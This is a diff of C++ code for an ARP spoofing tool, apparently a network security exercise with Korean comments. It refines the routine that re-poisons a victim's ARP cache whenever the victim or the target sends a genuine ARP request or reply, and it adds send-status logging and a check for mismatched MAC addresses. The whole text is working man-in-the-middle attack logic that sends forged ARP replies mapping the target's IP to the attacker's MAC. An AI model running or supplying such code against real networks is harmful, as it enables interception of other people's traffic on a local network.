@@ -255,8 +255,8 @@ int main(int argc, char* argv[]) {
         else if (ntohs(eth->type_) == EthHdr::Arp) {
             ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
             uint16_t op = ntohs(arp->op_);
-            Ip sip = ntohl(arp->sip_);
-            Ip tip = ntohl(arp->tip_);
+            Ip sip = Ip(ntohl(arp->sip_));
+            Ip tip = Ip(ntohl(arp->tip_));
             Mac smac = arp->smac_;
             Mac tmac = arp->tmac_;
         
@@ -265,32 +265,51 @@ int main(int argc, char* argv[]) {
                 if (op == ArpHdr::Request &&
                     sip == conn.sender_ip &&
                     tip == conn.target_ip) {
-                    EthArpPacket reinfect = make_arp_packet(
-                        Mac(attacker_mac), conn.sender_mac,
-                        Mac(attacker_mac), conn.sender_mac,
-                        conn.target_ip, conn.sender_ip,
-                        false
+        
+                    bool ok = send_arp_packet(handle,
+                        make_arp_packet(
+                            Mac(attacker_mac), conn.sender_mac,
+                            Mac(attacker_mac), conn.sender_mac,
+                            conn.target_ip, conn.sender_ip,
+                            false
+                        )
                     );
-                    send_arp_packet(handle, reinfect);
-                    cout << "[*] Re-infection (Request): " << sip << " → " << tip << '\n';
+        
+                    std::cout << "[*] Re-infection (Request): "
+                              << std::string(sip) << " → " << std::string(tip)
+                              << (ok ? " [SENT]" : " [FAILED]") << std::endl;
                 }
         
                 // [2] target이 sender에게 진짜 ARP Reply
                 else if (op == ArpHdr::Reply &&
                          sip == conn.target_ip &&
-                         tip == conn.sender_ip &&
-                         smac == conn.target_mac) {
-                    EthArpPacket reinfect = make_arp_packet(
-                        Mac(attacker_mac), conn.sender_mac,
-                        Mac(attacker_mac), conn.sender_mac,
-                        conn.target_ip, conn.sender_ip,
-                        false
+                         tip == conn.sender_ip) {
+        
+                    // MAC 비교 실패 시 디버깅
+                    if (smac != conn.target_mac) {
+                        std::cout << "[!] MAC mismatch: "
+                                  << "packet=" << std::string(smac)
+                                  << ", expected=" << std::string(conn.target_mac) << std::endl;
+                        continue;
+                    }
+        
+                    bool ok = send_arp_packet(handle,
+                        make_arp_packet(
+                            Mac(attacker_mac), conn.sender_mac,
+                            Mac(attacker_mac), conn.sender_mac,
+                            conn.target_ip, conn.sender_ip,
+                            false
+                        )
                     );
-                    send_arp_packet(handle, reinfect);
-                    cout << "[*] Re-infection (Reply): " << sip << " → " << tip << '\n';
+        
+                    std::cout << "[*] Re-infection (Reply): "
+                              << std::string(sip) << " → " << std::string(tip)
+                              << (ok ? " [SENT]" : " [FAILED]") << std::endl;
                 }
             }
         }
+
+        
     }
 
     pcap_close(handle);
